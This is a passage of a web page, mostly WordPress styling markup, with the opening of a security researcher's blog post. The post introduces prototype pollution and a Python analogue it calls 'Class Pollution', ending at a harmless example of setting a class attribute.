.wp-social-link-vimeo{background-color:#1eb7ea;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-vk{background-color:#4680c2;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-wordpress{background-color:#3499cd;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-whatsapp{background-color:#25d366;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-x{background-color:#000;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-yelp{background-color:#d32422;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-youtube{background-color:red;color:#fff}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link{background:none}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link svg{height:1.25em;width:1.25em}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-amazon{color:#f90}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-bandcamp{color:#1ea0c3}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-behance{color:#0757fe}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-bluesky{color:#0a7aff}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-codepen{color:#1e1f26}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-deviantart{color:#02e49b}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-discord{color:#5865f2}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-dribbble{color:#e94c89}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-dropbox{color:#4280ff}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-etsy{color:#f45800}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-facebook{color:#0866ff}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-fivehundredpx{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-flickr{color:#0461dd}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-foursquare{color:#e65678}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-github{color:#24292d}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-goodreads{color:#382110}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-google{color:#ea4434}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-gravatar{color:#1d4fc4}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-instagram{color:#f00075}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-lastfm{color:#e21b24}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-linkedin{color:#0d66c2}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-mastodon{color:#3288d4}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-medium{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-meetup{color:#f6405f}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-patreon{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-pinterest{color:#e60122}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-pocket{color:#ef4155}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-reddit{color:#ff4500}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-skype{color:#0478d7}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-snapchat{color:#fff;stroke:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-soundcloud{color:#ff5600}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-spotify{color:#1bd760}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-telegram{color:#2aabee}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-threads{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-tiktok{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-tumblr{color:#011835}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-twitch{color:#6440a4}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-twitter{color:#1da1f2}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-vimeo{color:#1eb7ea}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-vk{color:#4680c2}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-whatsapp{color:#25d366}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-wordpress{color:#3499cd}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-x{color:#000}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-yelp{color:#d32422}:where(.wp-block-social-links.is-style-logos-only) .wp-social-link-youtube{color:red}.wp-block-social-links.is-style-pill-shape .wp-social-link{width:auto}:root :where(.wp-block-social-links .wp-social-link a){padding:.25em}:root :where(.wp-block-social-links.is-style-logos-only .wp-social-link a){padding:0}:root :where(.wp-block-social-links.is-style-pill-shape .wp-social-link a){padding-left:.6666666667em;padding-right:.6666666667em}.wp-block-social-links:not(.has-icon-color):not(.has-icon-background-color) .wp-social-link-snapchat .wp-block-social-link-label{color:#000}
/*# sourceURL=https://blog.abdulrah33m.com/wp-includes/blocks/social-links/style.min.css */
</style>

<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
/*# sourceURL=/wp-includes/css/classic-themes.min.css */
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
/*# sourceURL=global-styles-inline-css */
</style>

<link rel='stylesheet' id='darkly-magazine-parent-style-css' href='https://blog.abdulrah33m.com/wp-content/themes/feather-magazine/style.css?ver=6.9.4' type='text/css' media='all' />
<link rel='stylesheet' id='darkly-magazine-google-fonts-css' href='//fonts.googleapis.com/css?family=Inter%3A400%2C600%2C700&#038;ver=6.9.4' type='text/css' media='all' />
<link rel='stylesheet' id='feather-magazine-style-css' href='https://blog.abdulrah33m.com/wp-content/themes/darkly-magazine/style.css?ver=6.9.4' type='text/css' media='all' />
<link rel='stylesheet' id='feather-magazine-fonts-css' href='//fonts.googleapis.com/css?family=Roboto%3A400%2C500%2C700%2C900' type='text/css' media='all' />
<link rel='stylesheet' id='enlighterjs-css' href='https://blog.abdulrah33m.com/wp-content/plugins/enlighter/cache/enlighterjs.min.css?ver=FKif601bnx4CR1H' type='text/css' media='all' />
<script type="text/javascript" src="https://blog.abdulrah33m.com/wp-content/plugins/google-analytics-for-wordpress/assets/js/frontend-gtag.min.js?ver=10.1.3" id="monsterinsights-frontend-script-js" async="async" data-wp-strategy="async"></script>
<script data-cfasync="false" data-wpfc-render="false" type="text/javascript" id='monsterinsights-frontend-script-js-extra'>/* <![CDATA[ */
var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"txt,py,pdf,zip,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/blog.abdulrah33m.com","hash_tracking":"false","v4_id":"G-Y0ZN4EZBE4"};/* ]]> */
</script>
<script type="text/javascript" src="https://blog.abdulrah33m.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://blog.abdulrah33m.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="https://blog.abdulrah33m.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://blog.abdulrah33m.com/wp-json/wp/v2/posts/60" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.abdulrah33m.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.9.4" />
<link rel="canonical" href="https://blog.abdulrah33m.com/prototype-pollution-in-python/" />
<link rel='shortlink' href='https://blog.abdulrah33m.com/?p=60' />

	<style type="text/css">
				
		#site-header { background-color: ; }
		.primary-navigation, #navigation ul ul li, #navigation.mobile-menu-wrapper { background-color: ; }
		a#pull, #navigation .menu a, #navigation .menu a:hover, #navigation .menu .fa > a, #navigation .menu .fa > a, #navigation .toggle-caret { color: #21ff9e }
		#sidebars .widget h3, #sidebars .widget h3 a, #sidebars h3 { color: ; }
		#sidebars .widget a, #sidebars a, #sidebars li a { color: ; }
		#sidebars .widget, #sidebars, #sidebars .widget li { color: ; }
		.post.excerpt .post-content, .pagination a, .pagination2, .pagination .dots { color: ; }
		.post.excerpt h2.title a { color: ; }
		.pagination a, .pagination2, .pagination .dots { border-color: ; }
		span.entry-meta{ color: ; }
		.article h1, .article h2, .article h3, .article h4, .article h5, .article h6, .total-comments, .article th{ color: ; }
		.article, .article p, .related-posts .title, .breadcrumb, .article #commentform textarea  { color: ; }
		.article a, .breadcrumb a, #commentform a { color: ; }
		#commentform input#submit, #commentform input#submit:hover{ background: ; }
		.post-date-feather, .comment time { color: ; }
		.footer-widgets #searchform input[type='submit'],  .footer-widgets #searchform input[type='submit']:hover{ background: ; }
		.footer-widgets h3:after{ background: ; }
		.footer-widgets h3{ color: ; }
		.footer-widgets .widget li, .footer-widgets .widget, #copyright-note{ color: ; }
		footer .widget a, #copyright-note a, #copyright-note a:hover, footer .widget a:hover, footer .widget li a:hover{ color: ; }
	</style>
        <style type="text/css">
        .total-comments span:after, span.sticky-post, .nav-previous a:hover, .nav-next a:hover, #commentform input#submit, #searchform input[type='submit'], .home_menu_item, .currenttext, .pagination a:hover, .readMore a, .feathermagazine-subscribe input[type='submit'], .pagination .current, .woocommerce nav.woocommerce-pagination ul li a:focus, .woocommerce nav.woocommerce-pagination ul li a:hover, .woocommerce nav.woocommerce-pagination ul li span.current, .woocommerce-product-search input[type="submit"], .woocommerce a.button, .woocommerce-page a.button, .woocommerce button.button, .woocommerce-page button.button, .woocommerce input.button, .woocommerce-page input.button, .woocommerce #respond input#submit, .woocommerce-page #respond input#submit, .woocommerce #content input.button, .woocommerce-page #content input.button, #sidebars h3.widget-title:after, .postauthor h4:after, .related-posts h3:after, .archive .postsby span:after, .comment-respond h4:after { background-color: #21ff9e; }
        #tabber .inside li .meta b,footer .widget li a:hover,.fn a,.reply a,#tabber .inside li div.info .entry-title a:hover, #navigation ul ul a:hover,.single_post a, a:hover, .sidebar.c-4-12 .textwidget a, #site-footer .textwidget a, #commentform a, #tabber .inside li a, .copyrights a:hover, a, .sidebar.c-4-12 a:hover, .top a:hover, footer .tagcloud a:hover,.sticky-text{ color: #21ff9e; }
        .corner { border-color: transparent transparent #21ff9e; transparent;}
        #navigation ul li.current-menu-item a, .woocommerce nav.woocommerce-pagination ul li span.current, .woocommerce-page nav.woocommerce-pagination ul li span.current, .woocommerce #content nav.woocommerce-pagination ul li span.current, .woocommerce-page #content nav.woocommerce-pagination ul li span.current, .woocommerce nav.woocommerce-pagination ul li a:hover, .woocommerce-page nav.woocommerce-pagination ul li a:hover, .woocommerce #content nav.woocommerce-pagination ul li a:hover, .woocommerce-page #content nav.woocommerce-pagination ul li a:hover, .woocommerce nav.woocommerce-pagination ul li a:focus, .woocommerce-page nav.woocommerce-pagination ul li a:focus, .woocommerce #content nav.woocommerce-pagination ul li a:focus, .woocommerce-page #content nav.woocommerce-pagination ul li a:focus, .pagination .current, .tagcloud a { border-color: #21ff9e; }
        #site-header { background-color:  !important; }
        .primary-navigation, #navigation ul ul li, #navigation.mobile-menu-wrapper { background-color: ; }
        a#pull, #navigation .menu a, #navigation .menu a:hover, #navigation .menu .fa > a, #navigation .menu .fa > a, #navigation .toggle-caret { color: #21ff9e }
        #sidebars .widget h3, #sidebars .widget h3 a, #sidebars h3 { color: ; }
        #sidebars .widget a, #sidebars a, #sidebars li a { color: ; }
        #sidebars .widget, #sidebars, #sidebars .widget li { color: ; }
        .post.excerpt .post-content, .pagination a, .pagination2, .pagination .dots { color: ; }
        .post.excerpt h2.title a { color: ; }
        .pagination a, .pagination2, .pagination .dots { border-color: ; }
        span.entry-meta{ color: ; }
        .article h1, .article h2, .article h3, .article h4, .article h5, .article h6, .total-comments, .article th{ color: ; }
        .article, .article p, .related-posts .title, .breadcrumb, .article #commentform textarea  { color: ; }
        .article a, .breadcrumb a, #commentform a { color: ; }
        #commentform input#submit, #commentform input#submit:hover{ background: ; }
        .post-date-feather, .comment time { color: ; }
        .footer-widgets #searchform input[type='submit'],  .footer-widgets #searchform input[type='submit']:hover{ background: ; }
        .footer-widgets h3:after{ background: ; }
        .footer-widgets h3{ color: ; }
        .footer-widgets .widget li, .footer-widgets .widget, #copyright-note{ color: ; }
        footer .widget a, #copyright-note a, #copyright-note a:hover, footer .widget a:hover, footer .widget li a:hover{ color: ; }
        </style>
        		<style type="text/css" id="wp-custom-css">
			.archive .postsby span {color: #21ff9e}
.site-branding {max-width: 50% !important}		</style>
		<style id='core-block-supports-inline-css' type='text/css'>
.wp-container-core-columns-is-layout-9d6595d7{flex-wrap:nowrap;}
/*# sourceURL=core-block-supports-inline-css */
</style>

</head>

<body class="wp-singular post-template-default single single-post postid-60 single-format-standard wp-theme-feather-magazine wp-child-theme-darkly-magazine">
	    <div class="main-container">
		<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
		<header id="site-header" role="banner">
			<div class="container clear">
				<div class="site-branding">
																	    <h2 id="logo" class="site-title" itemprop="headline">
								<a href="https://blog.abdulrah33m.com">Abdulrah33m&#039;s Blog</a>
							</h2><!-- END #logo -->
							<div class="site-description">Just another security researcher motivated by &quot;why&quot;s</div>
															</div><!-- .site-branding -->
							</div>
			<div class="primary-navigation">
				<a href="#" id="pull" class="toggle-mobile-menu">Menu</a>
				<div class="container clear">
					<nav id="navigation" class="primary-navigation mobile-menu-wrapper" role="navigation">
													<ul id="menu-main-menu" class="menu clearfix"><li id="menu-item-91" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-91"><a href="https://blog.abdulrah33m.com/about/">About</a></li>
</ul>											</nav><!-- #site-navigation -->
				</div>
			</div>
		</header><!-- #masthead -->

<div id="page" class="single">
	<div class="content">
		<!-- Start Article -->
				<div class="breadcrumb"><span class="root"><a  href="https://blog.abdulrah33m.com">Home</a></span><span><i class="feather-icon icon-angle-double-right"></i></span><span><a href="https://blog.abdulrah33m.com/category/research/" >Research</a></span><span><i class="feather-icon icon-angle-double-right"></i></span><span><span>Prototype Pollution in Python</span></span></div>
				<article class="article">		
						<div id="post-60" class="post post-60 type-post status-publish format-standard hentry category-research">
				<div class="single_post">

					<header>

						<!-- Start Title -->
						<h1 class="title single-title">Prototype Pollution in Python</h1>
						<!-- End Title -->
						<div class="post-date-feather">04/01/2023</div>

					</header>
					<!-- Start Content -->
					<div id="content" class="post-single-content box mark-links">
						
<h2 class="wp-block-heading"><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-vivid-green-cyan-color">&gt;</mark> TL;DR</h2>



<p>The main objective of this research is to prove the possibility of having a variant of Prototype Pollution in other programming languages, including those that are class-based by showing <strong><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-vivid-green-cyan-color">Class Pollution</mark></strong> in Python.</p>



<p>⚠️ <strong>Warning</strong>: This is a topic that I <s>am</s> should be working on, the post will be frequently updated with the new results. While I&#8217;ve found examples of the vulnerable merge function implemented in various open-source projects, I still haven&#8217;t found a full exploit leading to an RCE.</p>



<h2 class="wp-block-heading"><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-vivid-green-cyan-color">&gt;</mark> Background</h2>



<p>Prototype Pollution might be one of the coolest vulnerabilities to dig into as a researcher, researchers have been doing a great job to explore this topic further but there&#8217;s always more.<br>While reading about Prototype Pollution, I noticed that all resources are talking about Prototype Pollution in JavaScript, whether it&#8217;s client-side or server-side, and honestly speaking, there is a good explanation for that.<br>Prototype Pollution is one of the vulnerabilities that are language-specific as it <strong>should</strong> be affecting prototype-based programming languages only as the name suggests. While JavaScript is not the only programming language that is prototype-based, JavaScript is one of the most popular programming languages among them, therefore you&#8217;ll see that all resources are talking about Prototype Pollution in JS. It might be possible to see Prototype Pollution in other prototype-based languages, however, we cannot say that a programming language is vulnerable just because it uses prototypes.</p>



<p>As a Python fanboy (yes, I admit it), I believe that you can build anything in Python, even vulnerabilities (as if Prototype Pollution in JavaScript were not complicated enough!).</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img fetchpriority="high" decoding="async" width="600" height="450" src="https://blog.abdulrah33m.com/wp-content/uploads/2022/12/736kcx.jpg" alt="" class="wp-image-69" srcset="https://blog.abdulrah33m.com/wp-content/uploads/2022/12/736kcx.jpg 600w, https://blog.abdulrah33m.com/wp-content/uploads/2022/12/736kcx-300x225.jpg 300w" sizes="(max-width: 600px) 100vw, 600px" /></figure>
</div>


<h2 class="wp-block-heading"><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-vivid-green-cyan-color">&gt;</mark> No Prototypes, No Issue</h2>



<p>Let&#8217;s start by explaining what does <code data-enlighter-language="generic" class="EnlighterJSRAW">Prototype</code> mean and why it&#8217;s being used. JavaScript uses prototype-based inheritance model, though the name might sound weird, the idea is similar to the normal class-based inheritance with some differences (it&#8217;s just that JavaScript wants to make our lives <s>harder</s> easier).</p>



<blockquote class="wp-block-quote is-style-default is-layout-flow wp-block-quote-is-layout-flow">
<p>Prototypes are the mechanism by which JavaScript objects inherit features from one another.<br>When you try to access a property of an object: if the property can&#8217;t be found in the object itself, the prototype is searched for the property. If the property still can&#8217;t be found, then the prototype&#8217;s prototype is searched, and so on until either the property is found, or the end of the chain is reached, in which case <code data-enlighter-language="generic" class="EnlighterJSRAW">undefined</code> is returned.</p>
<cite><a href="https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/Object_prototypes" target="_blank" rel="noopener" title="">https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/Object_prototypes</a></cite></blockquote>



<p>After we knew what a Prototype is, let&#8217;s know a little bit more about Prototype Pollution. There are a lot of awesome resources explaining Prototype Pollution in JavaScript much in-depth, I suggest that you check them first before continuing to read.</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Prototype pollution is a vulnerability where an attacker is able to modify <code data-enlighter-language="generic" class="EnlighterJSRAW">Object.prototype</code>. Because nearly all objects in JavaScript are instances of <code data-enlighter-language="generic" class="EnlighterJSRAW">Object</code>, a typical object inherits properties (including methods) from <code data-enlighter-language="generic" class="EnlighterJSRAW">Object.prototype</code>. Changing <code data-enlighter-language="generic" class="EnlighterJSRAW">Object.prototype</code> can result in a wide range of issues, sometimes even resulting in remote code execution.</p>
<cite><a href="https://www.acunetix.com/vulnerabilities/web/prototype-pollution/">https://www.acunetix.com/vulnerabilities/web/prototype-pollution/</a></cite></blockquote>



<p>I love to see Prototype Pollution as a fancy exploitation of object injection vulnerability (where we inject into an object not injecting a new object), instead of setting an attribute for that single object only, we can pollute the parent prototype which will be reflected on all other objects that otherwise would be inaccessible. While it may have a lot in common with insecure deserialization, try not to confuse them together.</p>



<p>The flexibility being offered by some of the scripting languages such as Python makes the differences between prototype-based and class-based inheritance models unnoticeable in action. Therefore, we might be able to replicate the <strong>idea</strong> of Prototype Pollution in other programming languages, even those using class-based inheritance.<br>I&#8217;ll be referring to this vulnerability as <strong><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-vivid-green-cyan-color">Class Pollution</mark></strong> in this article since we don&#8217;t actually have prototypes in Python. Imagine saying we have found an SQL injection in a static web app that doesn&#8217;t even have a database!</p>



<p>Dunder methods (also known as magic methods) are special methods that are implicitly invoked by all objects in Python during various operations, such as <code data-enlighter-language="generic" class="EnlighterJSRAW">__str__()</code>, <code data-enlighter-language="generic" class="EnlighterJSRAW">__eq__()</code>, and <code data-enlighter-language="generic" class="EnlighterJSRAW">__call__()</code>.<br>They are used to specify what objects of a class should do when used in various statements and with various operators. Dunder methods have their own default implementation for built-in classes, which we will be implicitly inheriting from when creating a new class, however, developers can override these methods and provide their own implementation when defining new classes.</p>



<p>There are also other special attributes in every object in Python, such as <code data-enlighter-language="generic" class="EnlighterJSRAW">__class__</code>, <code data-enlighter-language="generic" class="EnlighterJSRAW">__doc__</code>, etc, each of these attributes is used for a specific purpose.</p>



<p>In Python, we don&#8217;t have Prototypes but we have <mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-vivid-green-cyan-color"><strong>special attributes</strong></mark>.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img decoding="async" width="500" height="610" src="https://blog.abdulrah33m.com/wp-content/uploads/2022/12/74qgjh.jpg" alt="" class="wp-image-209" srcset="https://blog.abdulrah33m.com/wp-content/uploads/2022/12/74qgjh.jpg 500w, https://blog.abdulrah33m.com/wp-content/uploads/2022/12/74qgjh-246x300.jpg 246w" sizes="(max-width: 500px) 100vw, 500px" /></figure>
</div>


<p>In Python it&#8217;s possible to update objects of mutable types to define or overwrite their attributes and methods at runtime. Let&#8217;s see it in action.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="beyond" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">class Employee: pass # Creating an empty class

emp = Employee()
another_emp = Employee()

Employee.name = 'No one' # Defining an attribute for the Employee class
print(emp.name)

